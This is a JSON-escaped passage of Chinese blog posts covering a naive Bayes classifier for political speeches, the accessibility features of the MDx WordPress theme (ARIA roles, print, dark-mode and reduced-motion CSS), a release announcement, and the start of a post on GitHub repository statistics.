篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener 